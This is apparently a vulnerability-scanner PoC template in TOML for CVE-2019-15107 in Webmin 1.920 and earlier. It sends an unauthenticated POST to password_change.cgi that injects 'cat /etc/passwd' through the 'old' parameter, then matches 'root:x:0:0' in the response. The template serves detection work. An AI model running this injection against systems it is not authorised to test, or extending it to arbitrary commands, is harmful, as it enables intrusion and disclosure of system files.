[info]
author = "ave"
description = "验证 Webmin password_change.cgi 中 old 参数的未授权命令注入漏洞。Webmin 1.920 及更早版本在 password_change.cgi 脚本的 old 参数处存在命令注入，未经身份认证的远程攻击者可构造 POST 请求执行任意操作系统命令。本 PoC 通过注入无害命令并检测响应特征确认漏洞存在。"
id = "POC-AVE-2019-0609"
name = "Webmin 1.920 Unauthenticated RCE PoC"
severity = "critical"
tags = ["ave-2019-0609"]
vuln_id = [
    "CVE-2019-15107",
    "AVE-2019-0609",
]

[poc]
logic = "all"

[[poc.requests]]
method = "POST"
path = "/{{BaseURL}}/password_change.cgi"
protocol = "http"

[poc.requests.body]
content = "user=root&pam=1&expired=1&old=cat%20/etc/passwd"
type = "form"

[poc.requests.headers]
Content-Type = "application/x-www-form-urlencoded"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["root:x:0:0"]
